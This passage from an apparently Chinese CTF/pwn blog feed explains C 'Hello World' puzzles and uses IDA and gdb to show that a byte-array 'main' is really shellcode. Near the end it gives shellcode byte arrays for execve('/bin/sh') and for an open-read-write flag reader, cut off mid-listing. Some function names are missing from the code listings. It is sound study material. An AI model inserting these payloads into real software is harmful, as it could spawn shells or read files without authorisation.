    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1+iP662u3Seb1eKdR03R0PpzlL1ShNgLwM= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.776Z</updated>
    
    <content type="html"><![CDATA[<p> 前段时间在逛知乎的时候，偶然发现一道有意思的编程题<br><img alt="知乎" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbqsq.png" class="lozad"><br>参考链接：<a href="https://www.zhihu.com/question/66088898/answer/238036040" target="_blank" rel="noopener">hello world编程题你会吗？</a><br> Helllo World算是最简单也最基础的程序了，我们一般在编写c语言代码的时候，输入输出都会很自然地联想到frintf()和scanf()，这几道题非常地有意思，要求跳出常规思维输出’’Hello World’。</p><h2 id="1-不用-“-“-输出Hello-World！"><a href="#1-不用-“-“-输出Hello-World！" class="headerlink" title="1.不用 “ “ 输出Hello,World！"></a>1.不用 “ “ 输出Hello,World！</h2><p> 不用” “输出，那么就不能用scanf()这个函数了，那么怎么办呢，想到c语言在处理字符常量的时候是把它当做数字来处理的，所以可以用普通char()函数把”Hello World”的每个字符的Ascii码输出。<br> 这道题如果引伸为不用引号来输出(单引号和双引号都不能使用),其实也是一样的，putchar()函数可以直接用数字作为参数。</p><h2 id="2-不用-输出Hello，World！"><a href="#2-不用-输出Hello，World！" class="headerlink" title="2.不用 ; 输出Hello，World！"></a>2.不用 ; 输出Hello，World！</h2><p> 不用;输出，也就是出代码中不能出现完整的语句，仔细思考下在c语言当中哪些位置可以不用;的，发现if语句刚好满足要求。</p><p>附上同时满足条件1和2的程序代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">72</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">101</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">32</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">87</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">114</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">100</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里需要说明的一点是，在最新的c标准中，已经不允许main函数的类型为void。</p><h2 id="3-不用-输出Hello-World！"><a href="#3-不用-输出Hello-World！" class="headerlink" title="3.不用# 输出Hello,World！"></a>3.不用# 输出Hello,World！</h2><p> 这道题不得不感叹自己所学的知识的贫瘠，一直想着怎么在windows编译环境下怎么达到这个条件，看了原帖的回复，说是要重新定义printf()函数，然后在dev里试了试重新定义了一下printf函数，发现报错没有定义printf()这个函数。<br> 后来才发现原来重新定义printf()函数在linux环境下是可以实现要求的。</p><p><img alt="img" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/dl53pg26qconiqrkjv1b43o1g7.png" class="lozad"></p><p>代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format,...)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hello, world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用"><a href="#4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用" class="headerlink" title="4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )"></a>4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )</h2><p> 第四题出题人并不是为了输出”Hello World”出的题，本意在了解ELF文件格式。<br>附上知乎大佬的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main = <span class="number">0x55</span>, main1 = <span class="number">0x48</span>, main2 = <span class="number">0x89</span>, main3 = <span class="number">0xe5</span>, main4 = <span class="number">0xb8</span>,</span><br><span class="line">           main5 = <span class="number">0x01</span>, main6 = <span class="number">0x00</span>, main7 = <span class="number">0x00</span>, main8 = <span class="number">0x00</span>, main9 = <span class="number">0xbb</span>,</span><br><span class="line">           main10 = <span class="number">0x01</span>, main11 = <span class="number">0x00</span>, main12 = <span class="number">0x00</span>, main13 = <span class="number">0x00</span>,</span><br><span class="line">           main14 = <span class="number">0x67</span>, main15 = <span class="number">0x8d</span>, main16 = <span class="number">0x35</span>, main17 = <span class="number">0x10</span>,</span><br><span class="line">           main18 = <span class="number">0x00</span>, main19 = <span class="number">0x00</span>, main20 = <span class="number">0x00</span>, main21 = <span class="number">0xba</span>,</span><br><span class="line">           main22 = <span class="number">0x0d</span>, main23 = <span class="number">0x00</span>, main24 = <span class="number">0x00</span>, main25 = <span class="number">0x00</span>,</span><br><span class="line">           main26 = <span class="number">0x0f</span>, main27 = <span class="number">0x05</span>, main28 = <span class="number">0xb8</span>, main29 = <span class="number">0x3c</span>,</span><br><span class="line">           main30 = <span class="number">0x00</span>, main31 = <span class="number">0x00</span>, main32 = <span class="number">0x00</span>, main33 = <span class="number">0x31</span>,</span><br><span class="line">           main34 = <span class="number">0xdb</span>, main35 = <span class="number">0x0f</span>, main36 = <span class="number">0x05</span>, main37 = <span class="number">0x48</span>,</span><br><span class="line">           main38 = <span class="number">0x65</span>, main39 = <span class="number">0x6c</span>, main40 = <span class="number">0x6c</span>, main41 = <span class="number">0x6f</span>,</span><br><span class="line">           main42 = <span class="number">0x20</span>, main43 = <span class="number">0x57</span>, main44 = <span class="number">0x6f</span>, main45 = <span class="number">0x72</span>,</span><br><span class="line">           main46 = <span class="number">0x6c</span>, main47 = <span class="number">0x64</span>, main48 = <span class="number">0x21</span>, main49 = <span class="number">0x0a</span>,</span><br><span class="line">           main50 = <span class="number">0x5d</span>;</span><br></pre></td></tr></table></figure><h2 id="5-对上述代码的分析"><a href="#5-对上述代码的分析" class="headerlink" title="5.对上述代码的分析"></a>5.对上述代码的分析</h2><p>其中最让我不能理解的是第四种方式输出的Hello ,World!</p><p>我用gcc编译器，把他编译后运行，的确能输出Hello ,World!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜   gcc test.c -o <span class="built_in">test</span></span><br><span class="line">➜   ./<span class="built_in">test</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><p>用ida反编译一下，可以看到start函数还是很正常的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004003E0 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004003E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004003E0                 xor     ebp, ebp</span><br><span class="line">.text:00000000004003E2                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000004003E5                 pop     rsi             ; argc</span><br><span class="line">.text:00000000004003E6                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000004003E9                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000004003ED                 push    rax</span><br><span class="line">.text:00000000004003EE                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000004003EF                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:00000000004003F6                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:00000000004003FD                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400404                 call    ___libc_start_main</span><br><span class="line">.text:0000000000400409                 hlt</span><br><span class="line">.text:0000000000400409 ; &#125; // starts at 4003E0</span><br><span class="line">.text:0000000000400409 _start          endp</span><br><span class="line">.text:0000000000400409</span><br></pre></td></tr></table></figure><p>继续看main函数,就变得很不正常了，而且他是在data段。？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000400564 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.rodata:0000000000400564 main            db  55h ; U             ; DATA XREF: _start+1D↑o</span><br><span class="line">.rodata:0000000000400565                 public main1</span><br><span class="line">.rodata:0000000000400565 main1           db  48h ; H</span><br><span class="line">.rodata:0000000000400566                 public main2</span><br><span class="line">.rodata:0000000000400566 main2           db  89h</span><br><span class="line">.rodata:0000000000400567                 public main3</span><br><span class="line">.rodata:0000000000400567 main3           db 0E5h</span><br><span class="line">.rodata:0000000000400568                 public main4</span><br><span class="line">.rodata:0000000000400568 main4           db 0B8h</span><br><span class="line">.rodata:0000000000400569                 public main5</span><br><span class="line">.rodata:0000000000400569 main5           db    1</span><br><span class="line">.rodata:000000000040056A                 public main6</span><br><span class="line">.rodata:000000000040056A main6           db    0</span><br><span class="line">.rodata:000000000040056B                 public main7</span><br><span class="line">.rodata:000000000040056B main7           db    0</span><br><span class="line">.rodata:000000000040056C                 public main8</span><br><span class="line">.rodata:000000000040056C main8           db    0</span><br><span class="line">.rodata:000000000040056D                 public main9</span><br><span class="line">.rodata:000000000040056D main9           db 0BBh</span><br><span class="line">.rodata:000000000040056E                 public main10</span><br><span class="line">.rodata:000000000040056E main10          db    1</span><br><span class="line">.rodata:000000000040056F                 public main11</span><br><span class="line">.rodata:000000000040056F main11          db    0</span><br><span class="line">.rodata:0000000000400570                 public main12</span><br><span class="line">.rodata:0000000000400570 main12          db    0</span><br><span class="line">.rodata:0000000000400571                 public main13</span><br><span class="line">.rodata:0000000000400571 main13          db    0</span><br><span class="line">.rodata:0000000000400572                 public main14</span><br><span class="line">.rodata:0000000000400572 main14          db  67h ; g</span><br><span class="line">.rodata:0000000000400573                 public main15</span><br><span class="line">.rodata:0000000000400573 main15          db  8Dh</span><br><span class="line">.rodata:0000000000400574                 public main16</span><br><span class="line">.rodata:0000000000400574 main16          db  35h ; 5</span><br><span class="line">.rodata:0000000000400575                 public main17</span><br><span class="line">.rodata:0000000000400575 main17          db  10h</span><br><span class="line">.rodata:0000000000400576                 public main18</span><br><span class="line">.rodata:0000000000400576 main18          db    0</span><br><span class="line">.rodata:0000000000400577                 public main19</span><br><span class="line">.rodata:0000000000400577 main19          db    0</span><br><span class="line">.rodata:0000000000400578                 public main20</span><br><span class="line">.rodata:0000000000400578 main20          db    0</span><br><span class="line">.rodata:0000000000400579                 public main21</span><br><span class="line">.rodata:0000000000400579 main21          db 0BAh</span><br><span class="line">.rodata:000000000040057A                 public main22</span><br><span class="line">.rodata:000000000040057A main22          db  0Dh</span><br><span class="line">.rodata:000000000040057B                 public main23</span><br><span class="line">.rodata:000000000040057B main23          db    0</span><br><span class="line">.rodata:000000000040057C                 public main24</span><br><span class="line">.rodata:000000000040057C main24          db    0</span><br><span class="line">.rodata:000000000040057D                 public main25</span><br><span class="line">.rodata:000000000040057D main25          db    0</span><br><span class="line">.rodata:000000000040057E                 public main26</span><br><span class="line">.rodata:000000000040057E main26          db  0Fh</span><br><span class="line">.rodata:000000000040057F                 public main27</span><br><span class="line">.rodata:000000000040057F main27          db    5</span><br><span class="line">.rodata:0000000000400580                 public main28</span><br><span class="line">.rodata:0000000000400580 main28          db 0B8h</span><br><span class="line">.rodata:0000000000400581                 public main29</span><br><span class="line">.rodata:0000000000400581 main29          db  3Ch ; &lt;</span><br><span class="line">.rodata:0000000000400582                 public main30</span><br><span class="line">.rodata:0000000000400582 main30          db    0</span><br><span class="line">.rodata:0000000000400583                 public main31</span><br><span class="line">.rodata:0000000000400583 main31          db    0</span><br><span class="line">.rodata:0000000000400584                 public main32</span><br><span class="line">.rodata:0000000000400584 main32          db    0</span><br><span class="line">.rodata:0000000000400585                 public main33</span><br><span class="line">.rodata:0000000000400585 main33          db  31h ; 1</span><br><span class="line">.rodata:0000000000400586                 public main34</span><br><span class="line">.rodata:0000000000400586 main34          db 0DBh</span><br><span class="line">.rodata:0000000000400587                 public main35</span><br><span class="line">.rodata:0000000000400587 main35          db  0Fh</span><br><span class="line">.rodata:0000000000400588                 public main36</span><br><span class="line">.rodata:0000000000400588 main36          db    5</span><br><span class="line">.rodata:0000000000400589                 public main37</span><br><span class="line">.rodata:0000000000400589 main37          db  48h ; H</span><br><span class="line">.rodata:000000000040058A                 public main38</span><br><span class="line">.rodata:000000000040058A main38          db  65h ; e</span><br><span class="line">.rodata:000000000040058B                 public main39</span><br><span class="line">.rodata:000000000040058B main39          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058C                 public main40</span><br><span class="line">.rodata:000000000040058C main40          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058D                 public main41</span><br><span class="line">.rodata:000000000040058D main41          db  6Fh ; o</span><br><span class="line">.rodata:000000000040058E                 public main42</span><br><span class="line">.rodata:000000000040058E main42          db  20h</span><br><span class="line">.rodata:000000000040058F                 public main43</span><br><span class="line">.rodata:000000000040058F main43          db  57h ; W</span><br><span class="line">.rodata:0000000000400590                 public main44</span><br><span class="line">.rodata:0000000000400590 main44          db  6Fh ; o</span><br><span class="line">.rodata:0000000000400591                 public main45</span><br><span class="line">.rodata:0000000000400591 main45          db  72h ; r</span><br><span class="line">.rodata:0000000000400592                 public main46</span><br><span class="line">.rodata:0000000000400592 main46          db  6Ch ; l</span><br><span class="line">.rodata:0000000000400593                 public main47</span><br><span class="line">.rodata:0000000000400593 main47          db  64h ; d</span><br><span class="line">.rodata:0000000000400594                 public main48</span><br><span class="line">.rodata:0000000000400594 main48          db  21h ; !</span><br><span class="line">.rodata:0000000000400595                 public main49</span><br><span class="line">.rodata:0000000000400595 main49          db  0Ah</span><br><span class="line">.rodata:0000000000400596                 public main50</span><br><span class="line">.rodata:0000000000400596 main50          db  5Dh ; ]</span><br><span class="line">.rodata:0000000000400596 _rodata         ends</span><br></pre></td></tr></table></figure><p>接下来我用gdb动态调试一波,下断点到main函数的地方,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x400564</span><br><span class="line">Breakpoint 2 at 0x400564</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400564 in main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────</span><br><span class="line"> RAX  0x400564 (main) ◂— push   rbp</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7fffffffde28 —▸ 0x7fffffffe1df ◂— &apos;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&apos;</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line"> R8   0x400550 (__libc_csu_fini) ◂— ret    </span><br><span class="line"> R9   0x7ffff7de7ac0 (_dl_fini) ◂— push   rbp</span><br><span class="line"> R10  0x846</span><br><span class="line"> R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14</span><br><span class="line"> R12  0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffde10 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x4004e0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400564 (main) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line"> ► 0x400564 &lt;main&gt;      push   rbp &lt;0x4004e0&gt;</span><br><span class="line">   0x400565 &lt;main1&gt;     mov    rbp, rsp</span><br><span class="line">   0x400568 &lt;main4&gt;     mov    eax, 1</span><br><span class="line">   0x40056d &lt;main9&gt;     mov    ebx, 1</span><br><span class="line">   0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</span><br><span class="line">   0x400579 &lt;main21&gt;    mov    edx, 0xd</span><br><span class="line">   0x40057e &lt;main26&gt;    syscall </span><br><span class="line">   0x400580 &lt;main28&gt;    mov    eax, 0x3c</span><br><span class="line">   0x400585 &lt;main33&gt;    xor    ebx, ebx</span><br><span class="line">   0x400587 &lt;main35&gt;    syscall </span><br><span class="line">   0x400589 &lt;main37&gt;    insb   byte ptr [rdi], dx</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fffffffdd40 ◂— 0x1</span><br><span class="line">02:0010│      0x7fffffffdd48 —▸ 0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line">03:0018│      0x7fffffffdd50 ◂— 0x1f7ffcca0</span><br><span class="line">04:0020│      0x7fffffffdd58 —▸ 0x400564 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fffffffdd60 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd68 ◂— 0x74c583ff1005bf92</span><br><span class="line">07:0038│      0x7fffffffdd70 —▸ 0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────</span><br><span class="line"> ► f 0           400564 main</span><br><span class="line">   f 1     7ffff7a2d830 __libc_start_main+240</span><br><span class="line">Breakpoint *0x400564</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>看到这里我明白了，上述代码其实是一段shellcode，gcc编译器是如何识别并编译的，这里我不得而知，看来还要再看一遍程序员的自我修养啊。</p><p>分析一下生成的汇编吧。<code>0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</code> 其中这段汇编让我很感兴趣，</p><p>程序动态执行的时候总是把静态的数据用这种方式<code>[eip + 0x10]</code>来传参</p><p>很显然里面存的是Hello world，然后syscall系统调用write函数输出，第二次syscall系统调用exit函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10s 0x400579+0x10</span><br><span class="line">0x400589 &lt;main37&gt;:&quot;Hello World!\n]&quot;</span><br><span class="line">0x400598:&quot;\001\033\003;,&quot;</span><br><span class="line">0x40059e:&quot;&quot;</span><br><span class="line">0x40059f:&quot;&quot;</span><br><span class="line">0x4005a0:&quot;\004&quot;</span><br><span class="line">0x4005a2:&quot;&quot;</span><br><span class="line">0x4005a3:&quot;&quot;</span><br><span class="line">0x4005a4:&quot;\030\376\377\377x&quot;</span><br><span class="line">0x4005aa:&quot;&quot;</span><br><span class="line">0x4005ab:&quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-模仿操作"><a href="#6-模仿操作" class="headerlink" title="6.模仿操作"></a>6.模仿操作</h2><p>用上述方式写 execve(“/bin/sh”)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>  main = <span class="number">0x6a</span>, main1 = <span class="number">0x42</span>, main2 = <span class="number">0x58</span>, main3 = <span class="number">0xfe</span>, main4 = <span class="number">0xc4</span>, main5 = <span class="number">0x48</span>, main6 = <span class="number">0x99</span>, main7 = <span class="number">0x52</span>, main8 = <span class="number">0x48</span>, main9 = <span class="number">0xbf</span>,main10 = <span class="number">0x2f</span>, main11 = <span class="number">0x62</span>, main12 = <span class="number">0x69</span>, main13 = <span class="number">0x6e</span>, main14 = <span class="number">0x2f</span>, main15 = <span class="number">0x2f</span>, main16 = <span class="number">0x73</span>, main17 = <span class="number">0x68</span>, main18 = <span class="number">0x57</span>, main19 = <span class="number">0x54</span>,main20 = <span class="number">0x5e</span>, main21 = <span class="number">0x49</span>, main22 = <span class="number">0x89</span>, main23 = <span class="number">0xd0</span>, main24 = <span class="number">0x49</span>, main25 = <span class="number">0x89</span>, main26 = <span class="number">0xd2</span>, main27 = <span class="number">0x0f</span>, main28 = <span class="number">0x05</span>;</span><br></pre></td></tr></table></figure><p>orw flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main=<span class="number">0x48</span>,main1=<span class="number">0xb8</span>,main2=<span class="number">0x1</span>,main3=<span class="number">0x1</span>,main4=<span class="number">0x1</span>,main5=<span class="number">0x1</span>,main6=<span class="number">0x1</span>,main7=<span class="number">0x1</span>,main8=<span class="number">0x1</span>,main9=<span class="number">0x1</span>,main10=<span class="number">0x50</span>,main11=<span class="number">0x48</span>,main12=<span class="number">0xb8</span>,main13=<span class="number">0x67</span>,main14=<span class="number">0x2e</span>,main15=<span class="number">0x67</span>,main16=<span class="number">0x6d</span>,main17=<span class="number">0x60</span>,main18=<span class="number">0x66</span>,main19=<span class="number">0x1</span>,main20=<span class="number">0x1</span>,main21=<span class="number">0x48</span>,main22=<span class="number">0x31</span>,main23=<span class="number">0x4</span>,main24=<span class="number">0x24</span>,main25=<span class="number">0x48</span>,main26=<span class="number">0xb8</span>,main27=<span class="number">0x2f</span>,main28=<span class="number">0x68</span>,main29=<span class="number">0x6f</span>,main30=<span class="number">0x6d</span>,main31=<span class="number">0x65</span>,main32=<span class="number">0x2f</span>,main33=<span class="number">0x63</span>,main34=<span class="number">0x74</span>,main35=<span class="number">0x50</span>,main36=<span class="number">0x48</span>,main37=<span class="number">0x89</span>,main38=<span class="number">0xe7</span>,main39=<span class="number">0x31</span>,main40=<span class="number">0xd2</span>,main41=<span 